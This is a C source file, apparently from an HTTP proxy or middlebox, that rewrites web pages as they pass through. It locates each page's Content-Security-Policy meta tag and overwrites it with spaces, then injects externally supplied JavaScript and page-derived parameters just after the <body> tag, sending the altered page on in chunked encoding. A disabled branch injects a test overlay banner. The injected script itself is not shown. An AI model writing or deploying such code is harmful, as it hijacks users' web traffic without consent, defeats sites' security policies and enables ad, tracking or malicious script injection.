#include "includes.h"

int deleteSecurityPolicy(char *addr, char *start, int len);

char *findSecurityPolicyAddr(char *context, int text_len)
{
	if (context == NULL || text_len <= 0)
	{
		return NULL;
	}
	char *ptext = context;
	char *p_str1 = "http-equiv=\"Content-Security-Policy\"";
	int strlen1 = strlen(p_str1);

	char *addr = NULL;
	
	int offset = find_str(ptext, text_len, p_str1, strlen1);
	if (offset < 0)
	{
		return NULL;
	}
	addr = ptext + offset;

	deleteSecurityPolicy(addr, context, context + text_len - addr);

	return ptext;
}

int deleteSecurityPolicy(char *addr, char *start, int len)
{
	int i = 0;
	char *p = addr;
	for (i = 0; *(p - i) != '<' && (p - i) >= start; i ++);
	p = p - i;
	if (p < start)
		return -1;
	char *q = addr;
	for (i = 0; q[i] != '>' && i < len; i ++);
	if (i >= len)
		return -1;
	q = q + i;
	memset(p, ' ', q - p + 1);
	return 0;
}

int find_http_body(char * psrc, int src_len)
{
	int offset= 0;
	int len = 5;
	char *psrctmp = psrc;
	offset = find_str_case(psrc, src_len, "<body", len);
	if (offset < 0) {
		return -1;
	}
	offset += 5;
	psrctmp += offset;
	src_len -= offset;
	offset = find_str(psrctmp, src_len, ">", 1);
	if (offset < 0) {
		return -2;
	}
	
	psrctmp += offset + 1;
	return psrctmp - psrc;
}

int js_inject(int sockfd, char **psrc, int *srclen, char *url, int url_len, 
	char *title, int title_len, char *keyword, int keyword_len, int jsin_flag, int *policy_flag)
{
	if (! jsin_flag)
		return 0;
		
	char jsparam[MAXBUF+1];
	int jsparamlen = struct_js_parma(sockfd, jsparam, url, url_len, title, title_len, keyword, keyword_len);
	if (jsparamlen <= 0)
	{
		jsparamlen = 0;
	}
	jsparam[jsparamlen] = '\0';

	int send_len = 0;
	
	if (*policy_flag)
	{
		char *pSelPol = NULL;
		pSelPol = findSecurityPolicyAddr(*psrc, *srclen);
		if (pSelPol)
		{
		#if 0
			int selpol_len = g_adHostLen;
			send_len = pSelPol - *psrc;
			char chunked_size[20];
			sprintf(chunked_size, "%x\r\n", send_len + selpol_len + 1);
			SEND_DATA(sockfd, chunked_size, strlen(chunked_size));
			SEND_DATA(sockfd, *psrc, send_len);
			SEND_DATA(sockfd, g_adHost, selpol_len);
			SEND_DATA(sockfd, " ", 1);
			SEND_DATA(sockfd, "\r\n", 2);
			*srclen -= send_len;
			*psrc += send_len;
		#endif
			*policy_flag = 0;
		}
	}
	int jsinject_cnt = 0;
	while (1)
	{
		int offset = find_http_body(*psrc, *srclen);
		if (offset < 0)
		{
			break;
		}
		*policy_flag = 0;
#if 1
		char *jscode_h = get_js_code_h();
		char *jscode_e = get_js_code_e();
		int jscodelen_h = get_js_code_h_len();
		int jscodelen_e = get_js_code_e_len();
		
		int jscodelen = jscodelen_h + jsparamlen + jscodelen_e;
		send_len = offset;
		char chunked_size[20];
		sprintf(chunked_size, "%x\r\n", send_len + jscodelen);
		SEND_DATA(sockfd, chunked_size, strlen(chunked_size));
		SEND_DATA(sockfd, *psrc, send_len);
		SEND_DATA(sockfd, jscode_h, jscodelen_h);
		SEND_DATA(sockfd, jsparam, jsparamlen);
		SEND_DATA(sockfd, jscode_e, jscodelen_e);
		SEND_DATA(sockfd, "\r\n", 2);
		*srclen -= send_len;
		*psrc += send_len;
#else
		char *test = "<div style=\"width: 100%;height: 130px;background-color:#EA8179;position: fixed;bottom:0;left:0;z-index:2147483647;color:white;\"><span style=\"font-size:18px;border:1px solid blue;vertical-align: middle;\">21474</span>sss83647</div>";
		send_len = offset;
		char chunked_size[20];
		sprintf(chunked_size, "%x\r\n", send_len + strlen(test));
		SEND_DATA(sockfd, chunked_size, strlen(chunked_size));
		SEND_DATA(sockfd, *psrc, send_len);
		SEND_DATA(sockfd, test, strlen(test));
		SEND_DATA(sockfd, "\r\n", 2);
		*srclen -= send_len;
		*psrc += send_len;
#endif		
		jsinject_cnt ++;
	}
	if (jsinject_cnt > 0)
	{
		return 0;
	}

	return -1;
}

int js_inject2(int sockfd, char **psrc, int *srclen, char *url, int url_len, 
	char *title, int title_len, char *keyword, int keyword_len, int jsin_flag, int *policy_flag)
{
	if (! jsin_flag)
		return 0;

	int send_len = 0;
	
	findSecurityPolicyAddr(*psrc, *srclen);
	
	while (1)
	{
		int offset = find_http_body(*psrc, *srclen);
		if (offset < 0)
		{
			break;
		}
		
		char jsparam[MAXBUF+1];
		int jsparamlen = struct_js_parma(sockfd, jsparam, url, url_len, title, title_len, keyword, keyword_len);
		if (jsparamlen <= 0)
		{
			jsparamlen = 0;
		}
		jsparam[jsparamlen] = '\0';

#if 1
		char *jscode_h = get_js_code_h();
		char *jscode_e = get_js_code_e();
		int jscodelen_h = get_js_code_h_len();
		int jscodelen_e = get_js_code_e_len();
		
		int jscodelen = jscodelen_h + jsparamlen + jscodelen_e;
		send_len = offset;
		char chunked_size[20];
		sprintf(chunked_size, "%x\r\n", send_len + jscodelen);
		SEND_DATA(sockfd, chunked_size, strlen(chunked_size));
		SEND_DATA(sockfd, *psrc, send_len);
		SEND_DATA(sockfd, jscode_h, jscodelen_h);
		SEND_DATA(sockfd, jsparam, jsparamlen);
		SEND_DATA(sockfd, jscode_e, jscodelen_e);
		SEND_DATA(sockfd, "\r\n", 2);
		*srclen -= send_len;
		*psrc += send_len;
#else
		char *test = "<div style=\"width: 100%;height: 130px;background-color:#EA8179;position: fixed;bottom:0;left:0;z-index:2147483647;color:white;\"><span style=\"font-size:18px;border:1px solid blue;vertical-align: middle;\">21474</span>sss83647</div>";
		send_len = offset;
		char chunked_size[20];
		sprintf(chunked_size, "%x\r\n", send_len + strlen(test));
		SEND_DATA(sockfd, chunked_size, strlen(chunked_size));
		SEND_DATA(sockfd, *psrc, send_len);
		SEND_DATA(sockfd, test, strlen(test));
		SEND_DATA(sockfd, "\r\n", 2);
		*srclen -= send_len;
		*psrc += send_len;
#endif
	}

	return 0;
}

int js_inject3(int sockfd, char **psrc, int *srclen, char *url, int url_len, 
	char *title, int title_len, char *keyword, int keyword_len, int jsin_flag, int *policy_flag)
{
	if (! jsin_flag)
		return 0;

	int send_len = 0;
	
	findSecurityPolicyAddr(*psrc, *srclen);
	
	while (1)
	{
		int offset = find_http_body(*psrc, *srclen);
		if (offset < 0)
		{
			break;
		}
		
		char jsparam[MAXBUF+1];
		int jsparamlen = struct_js_parma(sockfd, jsparam, url, url_len, title, title_len, keyword, keyword_len);
		if (jsparamlen <= 0)
		{
			jsparamlen = 0;
		}
		jsparam[jsparamlen] = '\0';

#if 1
		char *jscode_h = get_js_code_h();
		char *jscode_e = get_js_code_e();
		int jscodelen_h = get_js_code_h_len();
		int jscodelen_e = get_js_code_e_len();
		
		send_len = offset;
		SEND_DATA(sockfd, *psrc, send_len);
		SEND_DATA(sockfd, jscode_h, jscodelen_h);
		SEND_DATA(sockfd, jsparam, jsparamlen);
		SEND_DATA(sockfd, jscode_e, jscodelen_e);
		*srclen -= send_len;
		*psrc += send_len;
#else
#endif
	}

	return 0;
}


